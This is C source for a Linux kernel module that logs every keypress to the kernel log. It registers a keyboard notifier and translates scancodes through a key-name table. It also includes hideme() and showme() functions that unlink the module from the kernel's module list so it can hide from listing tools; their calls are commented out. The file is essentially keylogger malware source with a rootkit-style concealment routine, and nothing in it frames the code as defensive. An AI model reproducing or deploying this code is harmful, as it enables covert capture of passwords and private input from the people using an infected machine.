#include <linux/module.h>
#include <linux/kernel.h>
// #include <linux/notifier.h>
#include <linux/keyboard.h>
#include <net/netfilter/nf_conntrack_core.h>
#include <asm-generic/delay.h>
#include <linux/kallsyms.h>
#include <linux/vmalloc.h>


static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", 
								"_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", 
								"[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f", "g", "h", "j", "k", 
								"l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
								"/", "_SHIFT", "KeyPad *", "ALT_", "SPACE", "CAPS LOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
								"F8", "F9", "F10", "NUM_LOCK", "SCROLL_LOCK", "KeyPad 7", "KeyPad 8", "KeyPad 9", "KeyPad -", "KeyPad 4",
								"KeyPad 5", "KeyPad 6", "KeyPad +", "KeyPad 1", "KeyPad 2", "KeyPad 3", "KeyPad 0", "KeyPad .",
								"84_NOT_USED", "85_NOT_USED", "International", "F11", "F12", "89_NOT_USED", "90_NOT_USED", "91_NOT_USED", "92_NOT_USED",
								"93_NOT_USED", "94_NOT_USED", "95_NOT_USED", "KeyPad ENTER", "_CTRL", "KeyPad /", "PrintScrn", "_ALT", "101_NOT_USED", 
								"HOME", "CURSOR_UP", "PAGE_UP", "CURSOR_LEFT", "CURSOR_RIGHT", "END", "CURSOR_DOWN", "PAGE_DOWN", "INSERT", "DELETE", 
								"112_NOT_USED",  "112_NOT_USED", "113_NOT_USED", "114_NOT_USED", "115_NOT_USED", "116_NOT_USED", "117_NOT_USED", "118_NOT_USED",
								"PAUSE", "120_NOT_USED", "121_NOT_USED", "122_NOT_USED", "123_NOT_USED", "124_NOT_USED", "Logo Left", "Logo Right"};

static struct list_head *prev_module;

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param;
	param = _param;
	
	if(code == KBD_KEYCODE)
	{
		if(param->down)
		{
			// printk(KERN_NOTICE "Key Pressed: %s", keymap[param->value]);
			printk(KERN_NOTICE "Key Pressed: %s", keymap[param->value]);
		}
	}
	
	return NOTIFY_OK;
}

/* In order to get notified when a user presses a key, we must specify a value
for one of the attributes of the keyboard notifier_block struct. This struct is an
API mechanism provided by the kernel that gives a module access to some
keyboard functionality.
*/
static struct notifier_block nb = {
	.notifier_call = notify_keypress
};


// register and unregister, respectively, a keyboard notifier_block struct.
static int __init start(void)
{
	// showme();
	register_keyboard_notifier(&nb);
	printk(KERN_INFO "Keyboard Module Loaded!\n");
	// hideme();
	return 0;
}

static void __exit end(void)
{
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Module Unloaded!\n");
	// showme();
}


module_init(start);
module_exit(end);
MODULE_LICENSE("GPL");
